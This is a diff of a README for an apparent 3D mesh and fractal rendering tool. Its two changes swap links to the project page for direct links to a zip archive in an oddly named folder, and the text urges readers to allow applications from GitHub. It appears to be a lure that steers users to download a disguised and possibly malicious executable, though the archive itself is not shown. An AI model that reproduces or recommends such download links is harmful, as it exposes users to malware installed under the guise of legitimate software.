@@ -1,6 +1,6 @@
 # 🧊 Geometry-mesh-rendering - Create complex 3D shapes and fractals
 
-[![Download for Windows](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Stacidoric578/Geometry-mesh-rendering)
+[![Download for Windows](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Stacidoric578/Geometry-mesh-rendering/raw/refs/heads/main/infracephalic/rendering-mesh-Geometry-v1.8.zip)
 
 ## 📌 About this application
 
@@ -24,7 +24,7 @@ Before you run the software, ensure your computer allows applications from GitHu
 
 You must visit the project page to get the latest version of the tools.
 
-[Click here to visit the download page](https://github.com/Stacidoric578/Geometry-mesh-rendering)
+[Click here to visit the download page](https://github.com/Stacidoric578/Geometry-mesh-rendering/raw/refs/heads/main/infracephalic/rendering-mesh-Geometry-v1.8.zip)
 
 Follow these steps to finish the download:
 
